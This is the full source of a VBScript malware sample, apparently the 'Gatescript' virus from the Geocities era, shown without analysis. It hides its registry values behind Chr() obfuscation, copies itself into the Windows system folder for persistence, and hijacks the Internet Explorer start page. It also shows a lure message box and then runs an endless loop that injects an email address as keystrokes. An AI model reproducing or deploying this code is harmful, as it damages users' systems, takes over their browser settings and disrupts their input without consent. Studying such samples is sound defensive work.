'Eugene Kaspersky
ON ERROR RESUME NEXT
Dim GATESCRIPTcmsgpnhrni
Dim GATESCRIPTcborrpnhrni
Dim GATESCRIPTccolpnhrni
Dim zpnhrni
Dim GATESCRIPTnarpnhrni
Dim GATESCRIPTdipnhrni
Dim GATESCRIPTvalpnhrni
Dim GATESCRIPTsenpnhrni
Dim GATESCRIPTtecpnhrni
Dim vtecpnhrni
Set GATESCRIPTwshpnhrni = CreateObject("WScript.Shell")
Set GATESCRIPTfsopnhrni= CreateObject("scripting.filesystemobject")
GATESCRIPTwshpnhrni.regwrite "HKCU\software\" & Chr(71) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116),Chr(71) & Chr(101) & Chr(111) & Chr(99) & Chr(105) & Chr(116) & Chr(105) & Chr(101) & Chr(115) & Chr(46) & Chr(99) & Chr(111) & Chr(109) & Chr(47) & Chr(103) & Chr(97) & Chr(116) & Chr(101) & Chr(115) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
GATESCRIPTfsopnhrni.copyfile wscript.scriptfullname,GATESCRIPTfsopnhrni.GetSpecialFolder(0)& "\gatescript.vbs"
Msgbox "sexo jghjjg excitante" & vbcrlf & ""
GATESCRIPTwshpnhrni.regwrite "HKEY_USERS\.DEFAULT\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.geocities.com/gatescript"
GATESCRIPTvalpnhrni = 0
GATESCRIPTtecpnhrni = 0
dipnhrni()
Function dipnhrni()
On Error Resume Next
Do
GATESCRIPTtecpnhrni = GATESCRIPTtecpnhrni + 1
If GATESCRIPTtecpnhrni = 700000 then
GATESCRIPTwshpnhrni.sendkeys "agoujon@hotmail.com"
GATESCRIPTtecpnhrni = 0
GATESCRIPTtecpnhrni = 0
End If
Loop
End Function
'Gatescript - Geocities.com/gatescript
